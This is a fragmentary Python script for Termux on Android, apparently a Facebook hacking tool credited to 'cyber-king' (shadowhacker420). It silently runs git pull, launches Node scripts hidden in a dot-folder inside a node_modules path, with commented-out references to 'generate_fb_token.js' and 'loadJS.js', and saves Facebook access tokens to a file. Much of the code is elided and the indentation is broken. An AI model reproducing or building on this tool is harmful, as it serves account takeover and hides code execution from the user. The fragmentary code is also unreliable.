...
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/shadowhacker420/.empty/node_modules/bytes/index.js"):
    ...
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/shadowhacker420/.empty/node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("cd .termux && node index.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/shadowhacker420/.empty/node_modules/bytes/generate_fb_token.js"):
    #os.system("fuser -k 5000/tcp &")
    #os.system("cd .termux && node generate_fb_token.js &")
#elif os.path.isfile("/data/data/com.termux/files/home/shadowhacker420/.empty/node_modules/bytes/loadJS.js"):
    #os.system("fuser -k 5000/tcp &")
...
▀▄▄▄▄▄▀▄▀▄▀▄▄▀▄▄▀▄▄▄▄▀▀▄▄▄▄▀▀▄▄▄▀▄▄▄▀▀[1;0m
\033[1;97m--------------------------------------------------
\033[1;93m(!)\033[1;97m Author   : cyber-king
\033[1;93m(!)\033[1;97m Github   : https://github.com/shadowhacker420
\033[1;93m(!)\033[1;97m Fb Page  : https://m.facebook.com/102537698751441
...
def user_info():
    ...
    time.sleep(1)
    try:
        abm = open("/sdcard/. shadow.txt", "r").read()
...
def login_fb():
    ...
    q = json.loads(data)
    if "loc" in q:
        login_shadow = open('access_token.txt', 'w')
        login_shadow.write(q["loc"])
        login_shadow.close()
  print("")
